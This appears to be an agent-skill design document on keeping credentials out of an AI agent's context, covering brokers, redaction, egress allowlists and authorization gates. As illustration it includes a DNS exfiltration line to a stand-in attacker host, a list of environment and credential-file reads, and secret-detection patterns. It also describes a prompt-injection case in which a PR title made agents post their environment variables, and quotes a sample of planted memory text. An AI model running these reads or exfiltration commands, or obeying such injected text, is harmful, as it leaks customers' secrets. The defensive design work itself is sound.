---
name: credential-and-env-injection
description: Decides how secrets reach a generated agent stack and its synthesized tools without ever entering the model's context. Use when configuring API keys, database connection strings, or service tokens for generated agents; adding an environment variable or `.env` file to an agent runtime; designing a credential broker, secret manager integration, or `credential_ref` handle; deciding what authority a synthesized tool runs with; wiring redaction into traces, memory, or compaction; or reviewing any design where an agent with shell access is also given resource-plane credentials.
---

# Credential and env injection

Source: `research/08-auth-identity-and-secrets.md` §1, §3.4, §4, §8.1.

## Rule 0: two physically separate credential planes

Not two namespaces in one subsystem — **two subsystems that share no storage, no code path, and no
lifecycle.** Enforce with the type system, not a naming convention.

| | **Model plane** (upstream LLM) | **Resource plane** (customer's DBs, APIs, SaaS) |
|---|---|---|
| Leak costs | Money and quota | Data exfiltration, destruction, lateral movement |
| Reversible? | **Yes.** Revoke, dispute, re-mint | **Frequently not.** `DROP TABLE`, a wire transfer, a deleted bucket |
| Detection latency | Hours to days; spend anomalies are loud | Weeks to never; a table read looks like the app reading a table |
| Rotation cost | One string, one place | Pools, dependent services, cached sessions |
| Correct default | Long-lived tolerable if scoped and spend-capped | Long-lived **not tolerable** — short-lived, brokered, per-task |

Two consequences:

- **Spend an order of magnitude more security engineering on the resource plane.** A perfect model
  plane with a sloppy resource plane is a product that destroys data. The reverse is a product with
  a surprising invoice. Those are not comparable failures.
- **The model plane centralizes; the resource plane must decompose.** One model-plane credential per
  tenant per provider is fine and expected. One resource-plane credential per tenant is a
  catastrophe waiting for an injection. Fragment to per-tool, ideally per-call, ideally derived from
  the invoking user's authority.

There is a third, smaller **control plane** — the tenant API key the customer's backend uses to
reach the stack over HTTP/SSE, the iframe session token, audit signing keys. Treat the tenant API
key as high severity: it is an authenticated path to production tools.

## Rule 1: no secret ever enters the model's context

The tool schema exposes a **`credential_ref` enum bound to a manifest** (`orders_ro`,
`stripe_readonly`) — never a free-text secret field. The model emits the ref; middleware validates
it against the manifest and **hard-fails on unknown refs**; a broker outside the sandbox resolves it
server-side; the resolved value never returns to the model.

```yaml
# tool schema — correct
credential_ref:
  type: string
  enum: [orders_ro, stripe_readonly]   # bound to the manifest, validated in middleware
```

```yaml
# tool schema — wrong, in three different ways
connection_string: { type: string }    # free text: the model can be talked into supplying one
api_key:           { type: string }    # the secret is now in context, trace, cache, and memory
credential_ref:    { type: string }    # unbounded ref: no manifest to hard-fail against
```

### The redaction seam is *before* compaction and persistence

Redact on the way **in** to the model context as well as on the way out to storage. **The
tool-response serialization seam is the enforcement point; everything downstream is best-effort
cleanup.** Once a value is in the context window it is in the trace, the prompt cache, the
summarizer's input, and any memory the agent writes.

Compaction is the sneaky one: it reads the full context — including a tool output that contained a
credential — and writes a summary that may preserve it. So the seam must sit before compaction
input, not after.

Patterns worth matching: known prefixes (`sk-`, `sk-ant-`, `xai-`, `ghp_`, `github_pat_`, `AKIA`,
`ASIA`, `AIza`, `glpat-`), JWT three-part shapes, PEM blocks, `postgres://`/`mysql://`/`mongodb+srv://`
URIs carrying a password, `Authorization: Bearer` values, Shannon-entropy thresholds on long tokens.
Regex catches the 90% that leaks through `console.log` today; the residual is the argument for never
letting the secret near the boundary at all.

Ship a **CI canary test**: a synthetic credential must appear in **zero** persisted artifacts.

## Rule 2: env vars are the wrong default *here specifically*

The usual argument for env vars — keeps secrets off disk and out of the image — holds *"when only
your code runs in a container."* In this product arbitrary code runs; that is the product. Inducing
an agent to run `env`, `printenv`, or read `/proc/self/environ` yields the full set directly.

| Channel | Applies here? |
|---|---|
| Agent self-inspection (`env`, `/proc/self/environ`, `os.environ`) | **Yes — by design. This is the disqualifying one.** |
| Subprocess inheritance | **Yes.** `bash` is a first-class tool |
| CLI credential caching (`~/.aws`, `.netrc`, `.pgpass`, `.git-credentials`, shell history) | **Yes** |
| Traces, logs, crash dumps carrying the environment | Yes |
| Process listings (`ps e`, `/proc/<pid>/environ`) | Yes, within the sandbox |

A documented composite failure: a malicious pull-request **title alone** induced coding agents from
three vendors to post their own environment variables as a PR comment. Untrusted content → agent
reads its own environment → agent egresses it. The full lethal trifecta from one field of
attacker-controlled text.

**Env vars remain correct for:** non-secret configuration (model IDs, region, flags, log level,
topology selection); the **address of and identity material for the broker** (a SPIFFE Workload API
socket path, a Vault agent address, an OIDC token file path — references, not secrets); and local
development, explicitly and via a different code path than production.

### Mechanism ranking

| Mechanism | Out of agent's reach? | Verdict |
|---|---|---|
| Env vars | No | Non-secrets only |
| File-mounted (tmpfs, projected volume) | No — agent has the filesystem | Marginally better; not sufficient |
| Secret manager, agent fetches | No — agent holds the fetch token, value lands in agent memory | Fine for the orchestrator, **not** the sandbox |
| Dynamic/short-lived secrets (Vault DB engine, IAM DB auth) | Window shrinks to minutes | **Strongly recommended** |
| Workload identity federation (SPIFFE, cloud WIF) | Removes the long-lived secret entirely | Best available where supported |
| **Broker + `credential_ref` at the tool boundary** | **Yes** | **The core recommendation** |
| Transport-layer injection (sidecar adds auth after the request leaves the agent) | Yes, strongest | Target state; defer past v1 |

Dynamic secrets change incident response qualitatively: "revoke the one lease that task held"
instead of "rotate a credential that touches everything."

## Rule 3: resource-plane credentials must not be network-reachable from an agent shell

If `psql` in the sandbox can reach production, every tool-level control is bypassed — the agent
never needs the tool. Default: **no network path from the sandbox to the resource plane except
through policy-gated tools.** Default-deny egress at the host; block the cloud metadata endpoint and
RFC 1918.

**Unmet by v1, and the allowlist needs five terms rather than one — added 2026-08-03**
(`research/14-architecture-synthesis.md` **C-17**, §2.9 non-negotiable 4; `plan.md` **OD-12**,
~~proposed~~ **decided 2026-08-03**, with **OD-13** putting four of the five terms into the
constitution itself at v1.2.0 — read the row notes below for what each term now is). v1 emits a
shell and a general HTTP client with **open outbound network**, so this rule is
not merely under pressure from co-location (below) — it is unimplemented, and constitution Principle
IV's first bullet requires the same control independently. **The one-line version fails in five
specific ways, and the same control that fixes this rule also cuts the direct exfiltration channel
the lethal trifecta depends on** — one mechanism, two jobs:

| Term | Why the loose version fails |
|---|---|
| Allowlist by **host *and* port** | Co-location is the default here, so the target app and the database are often the same host: allowlisting the host permits `psql` to it and defeats this rule by way of its own remedy |
| **Pin addresses at configuration time** | A name-keyed allowlist re-resolves, and a re-resolved name can be re-pointed at loopback or the DB — DNS rebinding. ~~*"Named hosts"* is the constitution's phrasing and it is the weaker key~~ — **amended out 2026-08-03 (OD-13); Principle IV bullet 1 at v1.2.0 requires pinned addresses in as many words** |
| **DNS denied or proxied** | `dig $(secret).attacker.example` is a complete exfiltration channel that never completes a connection to a blocked destination |
| **Loopback denied even on an allowlisted host** | Alongside RFC 1918, link-local and the metadata address, which is credential theft rather than leakage |
| **Enforced at a mandatory proxy outside the sandbox** — ~~*at the host*~~, which is necessary and not sufficient | In-guest policy is configuration, and this is a program whose instructions come from attacker-influenceable text. **OD-12 goes further than the host firewall this row asked for: the sandbox's only reachable address is the proxy**, so a co-located database is not merely denied by port, it is unreachable, and **the sandbox needs no resolver at all** — the strongest available form of the DNS row above. The proxy must have no write path from the agent to its configuration, for the same reason the credential broker sits outside |

**What it does not reach:** the target application's own outbound features. An allowlist that permits
the target's API permits any endpoint of that API that fetches a URL on the agent's behalf, which
makes the target a confused deputy for egress — the deputy problem this document is about, arriving
through the one destination the policy has to allow (`14` **U-44**).

**The awkward case:** the tool is `run_shell_command` and the task is "run the migration." A
reference handle does not help; the subprocess needs a real DSN. Four options, none free:

1. **Don't allow it.** No shell path to the resource plane. Correct for the iframe tier and the
   default everywhere else. Costs real utility: the agent cannot debug against the live system.
2. **Sidecar proxy with transport-layer injection.** Subprocess connects to `localhost:5432` with no
   password; the proxy authenticates by attested identity and supplies a broker credential. Right
   target state, and real work — one protocol-aware proxy per protocol.
3. **Ephemeral credential injected into a single subprocess**, never the shell's environment, 60s
   TTL, lease revoked on exit. The agent can still read `/proc/<child>/environ` while the child
   runs, so this is mitigation, not prevention — but a 60-second read-only lease is a very different
   object from a standing DSN.
4. **Approve-per-invocation.** Correct for high-risk tenants, unusable as a default.

**Ship (1) as the default, (3) as opt-in for HTTP/SSE with explicit tenant configuration, build
toward (2). Never ship a default where a standing production DSN is reachable from an agent shell.**

## Self-hosted-first: what it discharges, and the two rules it makes harder

Added 2026-08-02, when `plan.md` OD-08 settled the deployment model — **ship self-hosted, design so
fully hosted stays reachable without a rewrite** (`research/14-architecture-synthesis.md` D-20). The
temptation this creates is to read every rule above as relaxed. **One of them is discharged and two
of them get harder.**

**Discharged, by construction rather than by mechanism: custody and cross-tenant blast radius.** The
broker runs inside the customer's boundary, so we never hold a production DSN, and the fleet-wide
breach that `research/08-auth-identity-and-secrets.md` §6.1 calls "the scenario that ends the
company" cannot happen because there is no such store. **That is the *custody* surface, not the
*confused-deputy* surface** — and OD-08's own summary says self-hosting "discharges most of the
confused-deputy surface," which is worth reading precisely: the deputy problem is an agent inside one
boundary being induced to misuse authority it legitimately holds, and none of Rules 0–4 above are
weakened by moving who owns the host.

**Harder, not easier — Rule 2.** `.env` beside the install is the most natural thing a self-hosted
operator will do, and it is exactly what Rule 2 forbids. Expect to argue this one more often, not
less.

**Harder, not easier — Rule 3.** This is the one OD-08 actively worsens. Co-location becomes the
**default topology** rather than a deployment mistake, so an agent shell sharing a host or a network
with the production database is now the expected arrangement — which is the precise condition under
which `psql` bypasses every control in this document. Default-deny egress is *more* necessary on a
single-tenant deployment, not less.

**And self-hosting changes *who applies* it, which is the part that has to reach a customer statement
honestly** (added 2026-08-03; `plan.md` **OD-12**, ~~proposed~~ **decided**). We specify the network policy; the
customer instantiates it. So the guarantee is a property of a **deployment**, not of the artifact we
ship, and two rules follow. **Do not require anything an operator will predictably route around** —
the likeliest widening is a package index so `pip install` works, and a package index is a complete
exfiltration channel because the requested *name* carries the payload, so ship dependencies resolved.
And **treat every widening as a reviewed configuration object** rather than a flag. The claim that
survives is *"in a deployment we have verified, the agent reaches your application's API and nothing
else"* — not *"the product cannot exfiltrate."*

**One design choice fell out of exactly this paragraph and is worth recording as precedent** (OD-12,
2026-08-03). Enforcing an HTTP **method** allowlist against an HTTPS target requires terminating TLS
at the proxy and trusting a proxy CA inside the sandbox — which asks a self-hosted operator to
generate and rotate CA material and to pin a certificate against their own private-CA or
self-signed target. **That was rejected on this section's own reasoning**: a control an operator
predictably routes around is worth less than a narrower one they will run. The chosen posture is
**re-origination** — the agent is handed a cleartext proxy endpoint as the target's base URL, the
proxy reads method and path in the clear and makes its own validated TLS connection to the pinned
address — which is available only because there is one destination and we own the base-URL string.
**With more than one destination, say plainly that you filter by destination only.**

**Deferred, not deleted.** Per-tenant DEKs and cross-tenant sandbox hygiene wait for the hosted tier
— **with two carve-outs that stay v1 work**, because they cannot be retrofitted: the tenant ID must
never be derivable from model output, and storage and the knowledge layer must be namespaceable while
exactly one namespace exists. A design that hardcodes a single tenant has foreclosed the hosted tier
rather than simplified the self-hosted one.

## Rule 4: generated tools default to `authorization: UNRESOLVED`

Static analysis of a data-access layer **structurally strips authorization**, because in a
well-factored app authz lives *above* that layer — in middleware, controllers, policy objects. The
analyzer sees `Order.where(...)` and cannot see that it was only ever reachable behind
`current_user`.

**Derivable with reasonable confidence:** read vs. write (highest-value inference; emit `SELECT`-only
roles and most destructive blast radius disappears); table/resource footprint (feeds
`GRANT SELECT ON <specific tables>`, not `ON ALL TABLES`); idempotence signals; external egress from
imports and call sites; and **declarative authorization annotations** — Pundit, CanCanCan, Django
permission classes, NestJS guards, Spring `@PreAuthorize`, Casbin/OPA. Lifting those is the
highest-leverage security feature the analyzer has; make it explicit, not incidental.

**Not derivable — fail loudly rather than guess:** whose data this is (the `current_user` →
`Order.user_id` binding lives in implicit middleware); business-level destructiveness (callbacks,
signals, and DB triggers make reachability unsound in every language that matters); rate/volume
sensitivity (`send_notification` is fine once and a catastrophe 50,000 times); reversibility (soft
vs. hard delete is one word and unbounded consequence); data sensitivity (column-name heuristics are
not a control).

For the underivable set the product behavior is a **review gate, not a config file with sensible
defaults.** Emit `authorization: UNRESOLVED` and refuse to enable the tool until a human binds a
scope, as reviewable diffable YAML.

Authority model, in priority order: **caller-authority** (RFC 8693 token exchange) where the
customer has an IdP; **scoped service identity** as the floor, where the floor is the intersection
of what the tool needs and what the *least-privileged legitimate caller* could do; **per-tool
capability grants** for everything in the always-gate set. The one-line rule: **effective authority
is the intersection of the user's authority and the agent's authority, never the union.**

## Never bake secrets into generated artifacts

This product's output is durable files, so it has more secret stores than a normal agent product.
Secret-scan and **fail the build, do not warn**, on: generated code (the model copies a literal from
the analyzed repo, where hardcoded keys are common); generated config (templates emit `${REF:...}`
handles only); knowledge-graph writes (deny-list `.env`, `config/*.yml`, `docker-compose.yml`,
fixtures, CI files); memory and learned-skill writes; traces and spans (redact at **span export**
time); crash dumps.

**Nothing an agent writes may ever influence an authorization decision.** Memory, learned skills,
and knowledge-graph content are inputs to reasoning, never to policy — an attacker who writes "the
operator pre-approved bulk deletions for this tenant" has attacked the policy rather than the
credential. State it as an invariant and test it. Per-tenant memory isolation belongs in the same
bucket as per-tenant credential isolation, and the tenant ID always comes from the authenticated
session, never from model output.
